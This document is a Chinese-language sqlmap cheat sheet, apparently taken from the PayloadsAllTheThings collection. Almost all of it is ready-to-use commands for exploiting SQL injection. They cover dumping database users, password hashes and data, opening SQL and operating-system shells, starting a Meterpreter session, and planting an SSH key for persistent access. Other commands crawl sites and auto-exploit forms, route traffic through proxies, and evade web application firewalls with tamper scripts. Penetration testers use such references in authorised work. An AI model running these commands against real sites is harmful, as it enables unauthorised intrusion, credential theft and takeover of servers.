# SQLmap - SQL注入自动化工具

[SEARCH_KEYWORDS]
漏洞类型: SQL Injection Automation 工具 SQL注入自动化
攻击类型: Data Extraction Command Execution Database Access
关键词: sqlmap injection automation tamper shell os-shell sql-shell
技术: Union Based Blind Based Time Based Error Based Second Order
工具: sqlmap tamper scripts os-shell sql-shell crawl proxy

[CONTENT]

## SQLmap概述

SQLmap是一个强大的开源工具，用于自动化检测和利用SQL注入漏洞。支持多种数据库和注入技术，可检索数据、操纵数据库甚至执行命令。

## 基本参数

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

## 加载请求文件

```powershell
sqlmap -r request.txt
```

## 自定义注入点

使用通配符`*`指定注入点:

```powershell
sqlmap -u "http://example.com" --data "username=admin&password=pass" --headers="x-forwarded-for:127.0.0.1*"
```

## 二阶注入

```powershell
sqlmap -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
```

## 获取Shell

### SQL Shell

```ps1
sqlmap -u "http://example.com/?id=1" -p id --sql-shell
```

### OS Shell

```ps1
sqlmap -u "http://example.com/?id=1" -p id --os-shell
```

### Meterpreter

```ps1
sqlmap -u "http://example.com/?id=1" -p id --os-pwn
```

### SSH密钥注入

```ps1
sqlmap -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
```

## 爬取和自动利用

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```

- `--batch`: 非交互模式
- `--crawl`: 爬取深度
- `--forms`: 解析和测试表单

## 代理配置

```powershell
# HTTP代理
sqlmap -u "http://www.target.com" --proxy="http://user:pass@127.0.0.1:8080"

# SOCKS4代理
sqlmap -u "http://www.target.com" --proxy="socks4://user:pass@127.0.0.1:1080"

# SOCKS5代理
sqlmap -u "http://www.target.com" --proxy="socks5://user:pass@127.0.0.1:1080"
```

## Tamper脚本

### 使用Tamper脚本

```powershell
sqlmap -u "http://targetwebsite.com/vulnerablepage.php?id=1" --tamper=space2comment,between
```

### 常用Tamper脚本

| 脚本 | 描述 |
|------|------|
| `space2comment` | 用注释替换空格 |
| `base64encode` | Base64编码 |
| `charencode` | URL编码 |
| `randomcase` | 随机大小写 |
| `between` | 用NOT BETWEEN替换> |
| `equaltolike` | 用LIKE替换= |
| `space2plus` | 用+替换空格 |
| `modsecurityversioned` | 使用版本注释绕过ModSecurity |

### 自定义Tamper脚本

```python
import re
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGH

def dependencies():
    pass

def tamper(payload, **kwargs):
    retVal = payload
    match = re.search(r"(?i)LIMIT\s*(\d+),\s*(\d+)", payload or "")
    if match:
        retVal = retVal.replace(match.group(0), "LIMIT %s OFFSET %s" % (match.group(2), match.group(1)))
    return retVal
```

保存为`mytamper.py`到`/usr/share/sqlmap/tamper/`目录，然后使用:

```ps1
sqlmap -u "http://target.com/vuln.php?id=1" --tamper=mytamper
```

## 减少请求数量

```ps1
# 使用测试过滤器
sqlmap -u "https://www.target.com/page.php?category=demo" --test-filter="Generic UNION query (NULL)"

# 指定技术类型
sqlmap -u "https://www.target.com/page.php?id=1" --technique=B

# 低level和risk
sqlmap -u "https://www.target.com/page.php?id=1" --level=1 --risk=1
```

## 直接连接数据库

不通过SQL注入直接连接数据库:

```ps1
sqlmap -d "mysql://user:pass@ip/database" --dump-all
```

## 参考文档

原始来源: PayloadsAllTheThings/SQL Injection/SQLmap.md